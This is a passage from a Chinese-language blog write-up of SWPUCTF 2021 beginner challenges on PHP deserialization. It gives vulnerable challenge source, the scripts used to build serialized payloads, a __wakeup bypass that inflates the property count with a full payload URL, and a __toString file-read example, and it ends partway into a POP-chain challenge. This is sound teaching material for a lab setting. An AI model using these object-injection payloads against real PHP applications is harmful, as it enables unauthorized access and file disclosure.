<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">show_source</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"cl45s.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">wllm</span><span style="color:#d4d4d4">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$admin</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> =</span><span style="color:#ce9178">"user"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"123456"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> === </span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> === </span><span style="color:#ce9178">"ctf"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"Just a bit more!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'p'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p>解题</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">wllm</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$admin</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> =</span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> =</span><span style="color:#ce9178">"ctf"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">wllm</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <h3 id="swpuctf-2021-新生赛no_wakeup"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛no_wakeup"></a> [SWPUCTF 2021 新生赛] no_wakeup</h3> <p>绕过 wakeup 魔术方法</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">header</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"Content-type:text/html;charset=utf-8"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">show_source</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"class.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">HaHaHa</span><span style="color:#d4d4d4">{</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$admin</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> =</span><span style="color:#ce9178">"user"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"123456"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> === </span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> === </span><span style="color:#ce9178">"wllm"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"No wake up"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$Letmeseesee</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'p'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$Letmeseesee</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p>考点：__wakeup () 函数的绕过：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 wakeup 的执行。因此，需要修改序列化字符串中的属性个数。</p> <p>漏洞影响<em>的版本</em>： <em>PHP</em>5 &lt; 5.6.25 <em>PHP</em>7 &lt; 7.0.10</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">HaHaHa</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$admin</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"wllm"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">HaHaHa</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p>输出如下：</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">O:</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"HaHaHa"</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">:{s:</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4">;s:</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"admin"</span><span style="color:#d4d4d4">;s:</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"passwd"</span><span style="color:#d4d4d4">;s:</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">"wllm"</span><span style="color:#d4d4d4">;}</span></span>
<span class="line"><span style="color:#d4d4d4">payload：http:</span><span style="color:#6a9955">//1.14.71.254:28886/class.php?p=O:6:%22HaHaHa%22:3:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;}</span></span></code></pre></div></div></figure> <h3 id="执行__tostring魔术方法"><a class="markdownIt-Anchor" href="#执行__tostring魔术方法"></a> 执行__toString () 魔术方法</h3> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Flag</span><span style="color:#d4d4d4">{  </span><span style="color:#6a9955">//flag.php  </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">;  </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__tostring</span><span style="color:#d4d4d4">(){  </span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">file</span><span style="color:#d4d4d4">)){  </span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">file</span><span style="color:#d4d4d4">); </span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"&lt;br&gt;"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> (</span><span style="color:#ce9178">"U R SO CLOSE !///COME ON PLZ"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }  </span></span>
<span class="line"><span style="color:#d4d4d4">    }  </span></span>
<span class="line"><span style="color:#d4d4d4">}  </span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p>本地进行序列化</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Flag</span><span style="color:#d4d4d4">{  </span><span style="color:#6a9955">//flag.php  </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">;  </span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__tostring</span><span style="color:#d4d4d4">(){  </span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">file</span><span style="color:#d4d4d4">)){  </span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">file</span><span style="color:#d4d4d4">); </span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"&lt;br&gt;"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> (</span><span style="color:#ce9178">"U R SO CLOSE !///COME ON PLZ"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }  </span></span>
<span class="line"><span style="color:#d4d4d4">    }  </span></span>
<span class="line"><span style="color:#d4d4d4">}  </span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Flag</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <h2 id="多个有类反序列化"><a class="markdownIt-Anchor" href="#多个有类反序列化"></a> 多个有类反序列化</h2> <h3 id="swpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pop"></a> [SWPUCTF 2021 新生赛] pop</h3> <p>1. 读源码</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">show_source</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"index.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w44m</span><span style="color:#d4d4d4">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$admin</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">'aaa'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">protected</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$passwd</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">'123456'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">Getflag</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4"> === </span><span style="color:#ce9178">'w44m'</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4"> ===</span><span style="color:#ce9178">'08067'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'flag.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">admin</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">passwd</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'nono'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w22m</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$w00m</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">w00m</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">w33m</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$w00m</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$w22m</span><span style="color:#d4d4d4">;</span></span>
